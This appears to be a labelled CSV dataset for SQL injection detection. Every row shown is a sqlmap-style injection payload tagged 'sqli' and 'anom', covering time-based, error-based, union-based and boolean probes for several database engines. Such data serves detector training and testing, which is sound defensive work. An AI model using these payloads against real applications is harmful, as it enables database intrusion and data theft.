Query,Length,Attack,Label
"1"")) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""fkip""=""fkip",219,sqli,anom
"1""))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",68,sqli,anom
"1') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('qtfl'='qtfl",217,sqli,anom
"1"");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",120,sqli,anom
"-9606 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))# iuij",206,sqli,anom
"1"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",90,sqli,anom
"1 where 9279=9279 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",93,sqli,anom
"1%' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and '%'='",214,sqli,anom
"1%""));select (case when (1499=4923) then 1499 else 1/(select 0) end)--",70,sqli,anom
"1'))) union all select null,null,null--",39,sqli,anom
"-4319"") where 7534=7534 or 8246=3217",36,sqli,anom
"1) where 9724=9724 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",124,sqli,anom
1'));begin user_lock.sleep(5); end--,36,sqli,anom
"1%' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and '%'='",215,sqli,anom
"1%') union all select null,null,null,null,null,null--",53,sqli,anom
"-8929%') union all select 9486,9486,9486,9486#",46,sqli,anom
"1') as asjj where 1721=1721 union all select null,null,null,null,null,null--",76,sqli,anom
"-4135"") as leiz where 3582=3582 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",264,sqli,anom
"1'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('xzcr'='xzcr",164,sqli,anom
"-1139) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",137,sqli,anom
"1'))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('rfln'='rfln",176,sqli,anom
"1') where 4750=4750 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",124,sqli,anom
1))) and 9198=9198--,20,sqli,anom
-4339) where 7178=7178 or 4008=7232,35,sqli,anom
"1')) as ytfi where 3323=3323 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",91,sqli,anom
1')));select (case when (5768=9169) then 5768 else 1/(select 0) end)--,70,sqli,anom
"1' where 3125=3125 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",207,sqli,anom
"1""))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (((""zoag"" like ""zoag",232,sqli,anom
"1'));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('kyos' like 'kyos",87,sqli,anom
"1%"");select pg_sleep(5)--",25,sqli,anom
"1)) as midl where 9046=9046 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",104,sqli,anom
"-9313%"") or 5971=4572#",22,sqli,anom
"-1083%""))) or elt(1032=1032,3623) and (((""%""=""",46,sqli,anom
"-6093') where 9676=9676 union all select 9676,9676,9676,9676,9676,9676--",72,sqli,anom
"-3179'+(select 'tzzz' where 3191=3191 union all select 3191,3191,3191,3191,3191#",80,sqli,anom
"1"");select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""yxes"" like ""yxes",85,sqli,anom
"1'));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (('frpo' like 'frpo",94,sqli,anom
1' where 9583=9583 and 5319=7670#,33,sqli,anom
"1%"")))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((""%""=""",205,sqli,anom
"1"")));if(8727=4039) select 8727 else drop function giql--",57,sqli,anom
"1"" and sleep(5)#",16,sqli,anom
"1 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",102,sqli,anom
"1""))) or elt(5873=5873,sleep(5))#",33,sqli,anom
"1'+(select pdfv where 1172=1172 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161))+'",126,sqli,anom
"1)) or 8514=benchmark(5000000,md5(0x544d5a4c))#",47,sqli,anom
"-3672"")) union all select 6093#",31,sqli,anom
"1%""))) rlike sleep(5) and (((""%""=""",34,sqli,anom
"1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'fjfo'='fjfo",158,sqli,anom
"1%')) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('%'='",167,sqli,anom
"1'))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((('gfll'='gfll",155,sqli,anom
"1"")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",97,sqli,anom
"1')) or 8466=benchmark(5000000,md5(0x694a4745)) and (('ossj'='ossj",66,sqli,anom
"1"") procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",94,sqli,anom
"1"")) and 7656=5604 and ((""zuhv""=""zuhv",37,sqli,anom
"1')) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('nlnk' like 'nlnk",183,sqli,anom
"1 where 4944=4944 union all select null,null,null,null,null,null,null,null,null#",80,sqli,anom
1%') or sleep(5)#,17,sqli,anom
"1'+(select unzl where 3432=3432 union all select null,null,null,null--",70,sqli,anom
"1,iif(1440=4612,1,1/0)",22,sqli,anom
"-9111"" or 3038=3038",19,sqli,anom
"1%'))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('%'='",124,sqli,anom
"-7258 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",136,sqli,anom
1)));select case when 7717=7717 then 1 else null end--,54,sqli,anom
"1%'));iif(5257=5257,1,1/0)",26,sqli,anom
"1%""))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""%""=""",215,sqli,anom
"1%')));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",97,sqli,anom
"1%"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",91,sqli,anom
"1 or 8514=benchmark(5000000,md5(0x544d5a4c))#",45,sqli,anom
1') and 7290=8416 and ('ktlz' like 'ktlz,40,sqli,anom
1%' or 4240=(select 4240 from pg_sleep(5))--,44,sqli,anom
"1') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",99,sqli,anom
"-7940%"") union all select 2779,2779,2779,2779,2779,2779,2779,2779,2779,2779#",76,sqli,anom
"-1692') union all select 7074,7074,7074,7074,7074,7074,7074#",60,sqli,anom
-5116) or (8287=4930)*4930,26,sqli,anom
"1"")) as ubrg where 7318=7318 and 7331=6529--",44,sqli,anom
"-5539"") union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--",71,sqli,anom
"1%"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (((""%""=""",102,sqli,anom
"1) as hvsk where 7902=7902;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",123,sqli,anom
1') as jlae where 1650=1650;begin user_lock.sleep(5); end--,59,sqli,anom
-3859) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (5846=5846,207,sqli,anom
"1%""))) union all select null,null,null,null,null,null,null,null,null--",70,sqli,anom
"1"" (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)",189,sqli,anom
"1)) as xroy where 3274=3274;iif(3760=4785,1,1/0)",48,sqli,anom
"1%"";begin user_lock.sleep(5); end and ""%""=""",43,sqli,anom
"1'||(select 'mzsy' where 4940=4940 or elt(5873=5873,sleep(5))#",62,sqli,anom
"iif(2976=2976,1,1/0)",20,sqli,anom
"1' union all select null,null,null#",35,sqli,anom
"1',(select 6825 from(select count(*),concat(0x7171706a71,(select (elt(6825=6825,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",169,sqli,anom
"1' union all select null,null,null,null,null--",46,sqli,anom
"1"");(select * from (select(sleep(5)))acdk)#",43,sqli,anom
"1))) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",80,sqli,anom
"-1204')) union all select 3585,3585--",37,sqli,anom
"1"") and (3020=3020)*6703 and (""qowc"" like ""qowc",47,sqli,anom
"-8758' union all select 6885,6885,6885,6885,6885,6885,6885,6885--",65,sqli,anom
"1') where 5925=5925 union all select null,null,null,null,null,null,null#",72,sqli,anom
"-2248'+(select wuow where 4421=4421 union all select 4421,4421,4421,4421,4421,4421--",84,sqli,anom
1;waitfor delay '0:0:5',23,sqli,anom
"1' or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'lxqz'='lxqz",174,sqli,anom
"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",69,sqli,anom
"1' or 8156=(select count(*) from generate_series(1,5000000))--",62,sqli,anom
"1')));select count(*) from generate_series(1,5000000) and ((('wvzw'='wvzw",73,sqli,anom
"1'+(select hspl where 4530=4530 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",130,sqli,anom
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('crkz'='crkz",116,sqli,anom
"-1270'||(select 'mgdi' where 6785=6785 union all select 6785,6785#",66,sqli,anom
1')));select pg_sleep(5)--,26,sqli,anom
"1 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)-- pvdw",82,sqli,anom
"1'+(select 'qzcx' where 9524=9524 and elt(3069=8430,8430))+'",60,sqli,anom
"1') as mwpp where 6192=6192;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",144,sqli,anom
"1%""))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""%""=""",80,sqli,anom
"-7776') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('ihof'='ihof",220,sqli,anom
"1);select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",90,sqli,anom
1')) as pdcl where 6964=6964;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,112,sqli,anom
"-5317')) union all select 7673,7673,7673,7673,7673,7673#",56,sqli,anom
"1%""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",97,sqli,anom
"1'))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",157,sqli,anom
"1'))) union all select null,null,null,null,null,null,null,null,null,null#",73,sqli,anom
"1')) and elt(6847=5874,5874) and (('yspu'='yspu",47,sqli,anom
1%') and (7704=3494)*3494 and ('%'=',36,sqli,anom
-7663')) or 1558=1104 and (('wsrq'='wsrq,40,sqli,anom
"-9996' or make_set(1237=7111,7111)",34,sqli,anom
"1""))) and 3824=benchmark(5000000,md5(0x76555642)) and (((""pnsz"" like ""pnsz",74,sqli,anom
"-6453"")) as hehs where 9363=9363 union all select 9363,9363,9363,9363,9363,9363,9363,9363,9363#",95,sqli,anom
"-5728) where 8663=8663 union all select 8663,8663,8663,8663,8663,8663,8663,8663,8663,8663#",90,sqli,anom
1' and 7533=7533 and 'clqy' like 'clqy,38,sqli,anom
"1%') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('%'='",111,sqli,anom
"1))) union all select null,null,null,null,null,null,null,null,null#",67,sqli,anom
1' where 4473=4473 and (select * from (select(sleep(5)))gcrr)#,62,sqli,anom
"1%"") procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (""%""=""",105,sqli,anom
"-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#",63,sqli,anom
"1%"" and 3824=benchmark(5000000,md5(0x76555642)) and ""%""=""",57,sqli,anom
"-6118 union all select 5906,5906,5906,5906,5906#",48,sqli,anom
1) as pqle where 4039=4039 and 7533=7533--,42,sqli,anom
"-9265"") or 7834=1685",20,sqli,anom
"1') and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",102,sqli,anom
"1)) as wajy where 8593=8593;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",95,sqli,anom
"1' in boolean mode);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3#",110,sqli,anom
"-2424) where 8132=8132 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",219,sqli,anom
"1)) and elt(9288=6067,6067) and ((1895=1895",43,sqli,anom
-3666') where 6386=6386 union all select 6386--,47,sqli,anom
1'||(select 'ylio' from dual where 3767=3767 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))||',229,sqli,anom
"-7184) as fshx where 3408=3408 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",227,sqli,anom
"1"" and make_set(8403=8403,8899) and ""bbgg""=""bbgg",48,sqli,anom
"1%"") and elt(7436=9874,9874) and (""%""=""",39,sqli,anom
"1"";call regexp_substring(repeat(right(char(3702),0),500000000),null) and ""rugr""=""rugr",85,sqli,anom
"-8178) union all select 4163,4163,4163,4163,4163,4163,4163--",60,sqli,anom
1) as jtfx where 8038=8038;select sleep(5)--,44,sqli,anom
1')));begin user_lock.sleep(5); end and ((('gqhc'='gqhc,55,sqli,anom
"-9840)) as thod where 4790=4790 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",228,sqli,anom
"1;select like('abcdefg',upper(hex(randomblob(500000000/2))))",60,sqli,anom
"1;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",100,sqli,anom
"1 where 6044=6044 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",174,sqli,anom
"1'));select count(*) from generate_series(1,5000000) and (('wmoo' like 'wmoo",76,sqli,anom
1' where 7191=7191 rlike sleep(5)--,35,sqli,anom
"1)(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))",199,sqli,anom
"-6642') where 3459=3459 union all select 3459,3459,3459,3459,3459,3459,3459,3459,3459#",86,sqli,anom
"-1859' union all select 1781,1781,1781,1781#",44,sqli,anom
"-7016%"")) union all select 8847,8847,8847--",43,sqli,anom
"(select (case when (1343=1343) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else 1343 end) from dual)",149,sqli,anom
1')));select case when 2948=7279 then 1 else null end--,55,sqli,anom
"1';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",88,sqli,anom
1) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),205,sqli,anom
"1"") and 7533=7533 and (""jfsw"" like ""jfsw",40,sqli,anom
"1%"";select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",88,sqli,anom
1') and 5999=5879,17,sqli,anom
"-4413%')) union all select 1345,1345#",37,sqli,anom
"-6388'+(select 'jqld' where 8600=8600 union all select 8600,8600#",65,sqli,anom
"1%"")));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",115,sqli,anom
"1')) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('tpcm' like 'tpcm",178,sqli,anom
"-2453"") union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520--",76,sqli,anom
1');(select * from (select(sleep(5)))srmq) and ('kerg' like 'kerg,65,sqli,anom
-7103)) or 4610=1871 and ((1249=1249,36,sqli,anom
"-5385"" union all select 4577,4577,4577,4577,4577,4577,4577#",59,sqli,anom
"1' where 8451=8451 union all select null,null,null,null,null,null,null,null,null#",81,sqli,anom
-4410 where 5749=5749 or 1317=9823--,36,sqli,anom
"1"")) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""yrgy"" like ""yrgy",89,sqli,anom
"-8129'))) union all select 4531,4531,4531#",42,sqli,anom
1')));select case when 3819=1887 then 1 else null end--,55,sqli,anom
"-1490'||(select 'uzbm' from dual where 3181=3181 union all select 3181,3181,3181,3181,3181--",92,sqli,anom
"1')));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",90,sqli,anom
1')) and sleep(5) and (('jiio' like 'jiio,41,sqli,anom
-8513) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (5818=5818,219,sqli,anom
-7378' or 6872=6872 and 'bnmn' like 'bnmn,41,sqli,anom
"1%') and make_set(8403=8403,8899) and ('%'='",44,sqli,anom
"1"" or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)",203,sqli,anom
